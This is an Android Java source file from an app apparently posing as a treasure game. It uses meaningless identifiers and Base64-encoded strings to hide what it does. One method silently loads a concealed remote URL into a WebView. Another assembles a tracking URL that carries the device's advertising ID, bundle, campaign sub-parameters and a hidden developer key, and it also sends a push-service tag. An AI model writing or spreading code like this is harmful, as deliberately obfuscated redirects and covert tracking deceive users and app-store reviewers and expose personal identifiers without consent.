package com.wiilld.weesst.tttreasure;

import android.os.Build;
import android.webkit.WebView;

import androidx.annotation.RequiresApi;

import com.onesignal.OneSignal;

import java.util.Base64;

public class Jsj {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void jsj(WebView jdsk){
        String dds = "aHR0cHM6Ly93d3cucHJpdmFjeXBvbGljeW9ubGluZS5jb20vbGl2ZS5waHA/dG9rZW49QlNDSE1nQ3pMSHVqclFKNlFETkVxaHBwUG55cnl0Zzk=";
        Base64.Decoder ksha = Base64.getDecoder();
        String oihns = new String(ksha.decode(dds));
        jdsk.loadUrl(oihns);
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String paaaaa(String rqqq, String ttte, String oijj, String oiug){

         String qqqqq;
         String wwwww;
         String eeeee;
         String rrrrr;
         String ttttt;
         String yyyyy;
         String uuuuu;


        String[] iiiii = rqqq.split("::");

        try {
            qqqqq = iiiii[0];
        }catch (Exception e){
            qqqqq = "";
        }
        try {
            wwwww = iiiii[1];
        }catch (Exception e){
            wwwww = "";
        }

        try {
            eeeee = iiiii[2];
        }catch (Exception e){
            eeeee = "";

        }

        try {
            rrrrr = iiiii[3];
        }catch (Exception e){
            rrrrr = "";
        }

        try {
            ttttt = iiiii[4];
        }catch (Exception e){
            ttttt = "";
        }


        try {
            yyyyy = iiiii[5];
        }catch (Exception e){
            yyyyy = "";
        }

        try {
            uuuuu = iiiii[6];
        }catch (Exception e){
            uuuuu = "";
        }

        OneSignal.sendTag(A.dds("c3ViX2FwcA=="), wwwww);

        String khsja [] = {qqqqq , A.dds("P2J1bmRsZT0=") , ttte , A.dds("JmFkX2lkPQ==") , oijj , A.dds("JmFwcHNfaWQ9") , oiug ,
                A.dds("JnN1YjY9") , wwwww ,
                A.dds("JnN1Yjc9") , eeeee ,
                A.dds("JnN1YjI9") , rrrrr ,
                A.dds("JnN1YjM9") , ttttt ,
                A.dds("JnN1YjQ9") , yyyyy ,
                A.dds("JnN1YjU9") , uuuuu ,
                A.dds("JmRldl9rZXk9") , A.dds(A.ihda)};
        StringBuilder sdad = new StringBuilder();
        for (int i = 0 ; i<khsja.length; i++){
            sdad.append(khsja[i]);
        }
        return sdad.toString();
    }
}
